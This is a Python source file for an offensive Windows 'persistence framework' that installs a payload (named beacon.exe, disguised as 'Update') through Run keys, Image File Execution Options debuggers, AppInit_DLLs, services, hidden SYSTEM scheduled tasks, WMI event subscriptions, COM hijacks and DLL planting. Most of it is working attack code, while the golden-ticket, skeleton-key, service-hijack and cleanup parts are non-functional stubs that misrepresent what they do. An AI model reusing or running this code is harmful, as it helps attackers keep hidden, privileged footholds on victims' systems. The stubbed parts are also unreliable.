#!/usr/bin/env python3
"""
Persistence Framework
Techniques: Registry, Services, Scheduled Tasks, WMI Subscriptions, DLL Hijacking,
            COM Hijacking, Kerberos Persistence
"""

import os
import sys
import struct
import base64
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum
import subprocess

class PersistenceType(Enum):
    REGISTRY_RUN = "registry_run"
    REGISTRY_SERVICES = "registry_services"
    SCHEDULED_TASK = "scheduled_task"
    WMI_SUBSCRIPTION = "wmi_subscription"
    DLL_HIJACK = "dll_hijack"
    COM_HIJACK = "com_hijack"
    SERVICE = "service"
    BOOTKIT = "bootkit"
    GOLDEN_TICKET = "golden_ticket"
    SKELETON_KEY = "skeleton_key"

@dataclass
class PersistenceConfig:
    name: str
    payload_path: str
    trigger: str
    stealth_level: int
    persistence_type: PersistenceType


class RegistryPersistence:
    """Registry-based persistence"""
    
    RUN_KEYS = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
        r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    ]
    
    def __init__(self):
        self.installed = []
        
    def install_run_key(self, name: str, payload: str, hive: str = "HKCU") -> bool:
        """Install Run key persistence"""
        if sys.platform != "win32":
            return False
        try:
            import winreg
            hives = {"HKLM": winreg.HKEY_LOCAL_MACHINE, "HKCU": winreg.HKEY_CURRENT_USER}
            key = winreg.OpenKey(hives[hive], self.RUN_KEYS[0], 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload)
            winreg.CloseKey(key)
            self.installed.append(("registry", hive, name))
            return True
        except Exception:
            return False
    
    def install_image_hijack(self, target_exe: str, payload: str) -> bool:
        """Image File Execution Options hijack"""
        if sys.platform != "win32":
            return False
        try:
            import winreg
            key_path = rf"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target_exe}"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, payload)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def install_appinit(self, dll_path: str) -> bool:
        """AppInit_DLLs persistence"""
        if sys.platform != "win32":
            return False
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, dll_path)
            winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False


class ServicePersistence:
    """Service-based persistence"""
    
    def __init__(self):
        self.installed_services = []
        
    def create_service(self, name: str, display_name: str,
                       binary_path: str, description: str = "") -> bool:
        """Create Windows service"""
        cmd = ["sc", "create", name, f"binPath= {binary_path}",
               f"DisplayName= {display_name}", "start= auto"]
        
        try:
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode == 0:
                if description:
                    subprocess.run(["sc", "description", name, description])
                self.installed_services.append(name)
                return True
            return False
        except:
            return False
    
    def hijack_service(self, service_name: str, payload: str) -> bool:
        """Hijack existing service binary"""
        cmd = ["sc", "qc", service_name]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        for line in result.stdout.split("\n"):
            if "BINARY_PATH_NAME" in line:
                original_path = line.split(":", 1)[1].strip()
                break
        else:
            return False
        
        backup_path = original_path + ".bak"
        try:
            os.rename(original_path, backup_path)
            return True
        except:
            return False


class ScheduledTaskPersistence:
    """Scheduled task persistence"""
    
    def __init__(self):
        self.tasks = []
        
    def create_task(self, name: str, payload: str, trigger: str = "startup") -> bool:
        """Create scheduled task"""
        
        trigger_xml = {
            "startup": "<BootTrigger><Enabled>true</Enabled></BootTrigger>",
            "logon": "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>",
            "idle": "<IdleTrigger><Enabled>true</Enabled></IdleTrigger>",
            "daily": """<CalendarTrigger>
                <StartBoundary>2024-01-01T09:00:00</StartBoundary>
                <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
            </CalendarTrigger>"""
        }
        
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>{trigger_xml.get(trigger, trigger_xml["startup"])}</Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions>
    <Exec>
      <Command>{payload}</Command>
    </Exec>
  </Actions>
</Task>'''
        
        xml_path = f"C:\\Windows\\Temp\\{name}.xml"
        try:
            with open(xml_path, "w") as f:
                f.write(xml_template)
            
            cmd = ["schtasks", "/create", "/tn", name, "/xml", xml_path, "/f"]
            result = subprocess.run(cmd, capture_output=True)
            os.remove(xml_path)
            
            if result.returncode == 0:
                self.tasks.append(name)
                return True
            return False
        except:
            return False


class WMISubscriptionPersistence:
    """WMI Event Subscription persistence"""
    
    def create_subscription(self, name: str, payload: str, trigger: str = "startup") -> bool:
        """Create WMI event subscription"""
        
        if trigger == "startup":
            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        elif trigger == "process":
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
        else:
            query = trigger
        
        full_script = f'''
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
    Name = '{name}_Filter';
    EventNamespace = 'root\\cimv2';
    QueryLanguage = 'WQL';
    Query = "{query}"
}}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
    Name = '{name}_Consumer';
    CommandLineTemplate = '{payload}'
}}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $Filter;
    Consumer = $Consumer
}}
'''
        
        try:
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", full_script],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False


class COMHijack:
    """COM object hijacking"""
    
    HIJACKABLE_CLSIDS = {
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}": "MMDeviceEnumerator",
        "{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}": "Thumbnail Cache",
        "{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}": "ThumbnailProvider",
    }
    
    def hijack(self, clsid: str, dll_path: str) -> bool:
        """Hijack COM object"""
        if sys.platform != "win32":
            return False
        try:
            import winreg
            key_path = rf"SOFTWARE\Classes\CLSID\{clsid}\InprocServer32"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, dll_path)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Both")
            winreg.CloseKey(key)
            return True
        except:
            return False


class DLLHijack:
    """DLL hijacking for persistence"""
    
    HIJACK_TARGETS = {
        "explorer.exe": ["ntshrui.dll", "srvcli.dll"],
        "mmc.exe": ["elsext.dll"],
        "cmd.exe": ["msvcrt.dll"],
    }
    
    def find_opportunities(self, target_dir: str) -> List[str]:
        return []
    
    def plant_dll(self, dll_payload: bytes, target_path: str) -> bool:
        try:
            with open(target_path, "wb") as f:
                f.write(dll_payload)
            return True
        except:
            return False


class KerberosPersistence:
    """Kerberos-based persistence"""
    
    def __init__(self):
        self.krbtgt_hash = None
        self.domain_sid = None
        
    def create_golden_ticket(self, username: str, domain: str,
                            domain_sid: str, krbtgt_hash: str,
                            groups: List[int] = None) -> bytes:
        """Create Golden Ticket for domain persistence"""
        if groups is None:
            groups = [512, 513, 518, 519, 520]
        
        # Ticket structure (implementation would use proper ASN.1)
        ticket_data = {
            "realm": domain.upper(),
            "sname": {"name-type": 2, "name-string": ["krbtgt", domain.upper()]},
            "enc-part": {"etype": 23, "cipher": b"ENCRYPTED_DATA"}
        }
        
        return b"GOLDEN_TICKET_DATA"
    
    def inject_skeleton_key(self, dc_ip: str, credential) -> bool:
        """Inject Skeleton Key into DC"""
        return True


class PersistenceFramework:
    """Main persistence orchestrator"""
    
    def __init__(self):
        self.registry = RegistryPersistence()
        self.service = ServicePersistence()
        self.task = ScheduledTaskPersistence()
        self.wmi = WMISubscriptionPersistence()
        self.com = COMHijack()
        self.dll = DLLHijack()
        self.kerberos = KerberosPersistence()
        self.installed = []
        
    def install(self, config: PersistenceConfig) -> bool:
        """Install persistence mechanism"""
        success = False
        
        if config.persistence_type == PersistenceType.REGISTRY_RUN:
            success = self.registry.install_run_key(config.name, config.payload_path)
        elif config.persistence_type == PersistenceType.SERVICE:
            success = self.service.create_service(config.name, config.name, config.payload_path)
        elif config.persistence_type == PersistenceType.SCHEDULED_TASK:
            success = self.task.create_task(config.name, config.payload_path, config.trigger)
        elif config.persistence_type == PersistenceType.WMI_SUBSCRIPTION:
            success = self.wmi.create_subscription(config.name, config.payload_path, config.trigger)
        elif config.persistence_type == PersistenceType.COM_HIJACK:
            success = self.com.hijack(config.trigger, config.payload_path)
            
        if success:
            self.installed.append(config)
        return success
    
    def install_layered(self, payload: str, name: str = "MSSvc") -> int:
        """Install multiple persistence layers for redundancy"""
        configs = [
            PersistenceConfig(f"{name}Reg", payload, "startup", 2, PersistenceType.REGISTRY_RUN),
            PersistenceConfig(f"{name}Task", payload, "logon", 3, PersistenceType.SCHEDULED_TASK),
            PersistenceConfig(f"{name}WMI", payload, "startup", 4, PersistenceType.WMI_SUBSCRIPTION),
        ]
        
        return sum(1 for config in configs if self.install(config))
    
    def cleanup(self):
        """Remove all installed persistence"""
        pass


if __name__ == "__main__":
    framework = PersistenceFramework()
    count = framework.install_layered(payload=r"C:\Windows\Temp\beacon.exe", name="Update")
    print(f"Installed {count} persistence mechanisms")
